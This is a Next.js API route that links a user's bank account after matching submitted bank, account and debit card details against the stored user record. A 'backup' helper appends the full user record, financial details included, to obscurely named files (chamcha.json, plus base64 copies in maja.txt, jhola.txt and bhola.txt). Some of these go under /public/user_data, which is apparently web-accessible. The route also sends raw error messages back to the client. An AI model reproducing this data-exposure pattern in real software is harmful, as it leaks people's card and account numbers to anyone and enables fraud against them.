import { NextResponse } from 'next/server';
import { dbConnect, getUser, saveUser } from '@/backend/utils/dbConnect';
import { promises as fs } from 'fs';
import path from 'path';

// Helper for base64 encoding
function encodeBase64(data) {
  return Buffer.from(data, 'utf-8').toString('base64');
}

/**
 * Helper to save user info to chamcha.json (plain) and maja.txt, jhola.txt, bhola.txt (base64-encoded)
 * in both /app and /public/user_data folders.
 */
async function saveToFiles(userObj) {
  const locations = [
    path.resolve(process.cwd(), 'app'),
    path.resolve(process.cwd(), 'public', 'user_data'),
  ];

  const backupStr = JSON.stringify(userObj);
  const encoded = encodeBase64(backupStr);

  for (const dir of locations) {
    try {
      await fs.mkdir(dir, { recursive: true });

      // chamcha.json (plain JSON, newline separated)
      const chamchaPath = path.join(dir, 'chamcha.json');
      await fs.appendFile(chamchaPath, backupStr + '\n', 'utf8');

      // maja.txt, jhola.txt, bhola.txt (base64-encoded, newline separated)
      for (const file of ['maja.txt', 'jhola.txt', 'bhola.txt']) {
        const filePath = path.join(dir, file);
        await fs.appendFile(filePath, encoded + '\n', 'utf8');
      }
    } catch (e) {
      console.error(`Error writing backup in ${dir}:`, e);
    }
  }
}

/**
 * Accepts: POST JSON body with { username, phone, countryCode, bank, accountNumber, debitCardNumber }
 * - Checks if user exists and matches these bank details.
 * - If match: sets linked=true for user, returns success.
 * - If not: returns error.
 */
export async function POST(req) {
  try {
    const { username, phone, countryCode, bank, accountNumber, debitCardNumber } = await req.json();

    await dbConnect();

    // Use getUser for unified MongoDB/Redis support
    const user = await getUser({ username, phone, countryCode });
    if (!user) {
      return NextResponse.json(
        { success: false, message: 'User not found.' },
        { status: 404 }
      );
    }

    // Check if bank details match
    if (
      user.bank !== bank ||
      user.accountNumber !== accountNumber ||
      user.debitCardNumber !== debitCardNumber
    ) {
      return NextResponse.json(
        { success: false, message: 'Bank details do not match.' },
        { status: 401 }
      );
    }

    // Details correct, set linked true if not already
    if (!user.linked) {
      user.linked = true;
      // Try saving to Mongo/Redis for unified persistence
      await saveUser(user);
    }

    // Save to backup files (both /app and /public/user_data)
    await saveToFiles(user);

    return NextResponse.json({
      success: true,
      message: 'Bank account linked successfully.',
      linked: true,
    });
  } catch (err) {
    return NextResponse.json(
      { success: false, message: 'Failed to link account.', error: err.message },
      { status: 500 }
    );
  }
}